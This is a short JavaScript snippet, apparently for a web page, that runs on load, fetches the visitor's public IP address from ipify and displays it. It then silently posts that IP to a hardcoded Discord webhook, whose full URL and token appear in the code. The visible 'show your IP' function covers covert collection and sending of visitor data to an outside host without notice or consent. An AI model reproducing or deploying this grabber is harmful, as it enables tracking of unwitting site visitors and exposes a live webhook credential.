async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;
        console.log("User's Public IP Address is: ", ip);
        document.getElementById('user-ip').innerText = ip;

        const webhookUrl = 'https://discord.com/api/webhooks/1251982784361402379/u0RehBPRJTByeJILdQMCDPUshnNPC1WqGtdbxyhLuVZTlGjqm6AunAXV7utWDGd-R5VZ';
        const payload = {
            content: `User's Public IP Address: ${ip}`
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        console.log('IP address sent to Discord webhook successfully.');

    } catch (error) {
        console.error("Error fetching or sending IP address: ", error);
        document.getElementById('user-ip').innerText = 'Error fetching IP address';
    }
}

getPublicIP();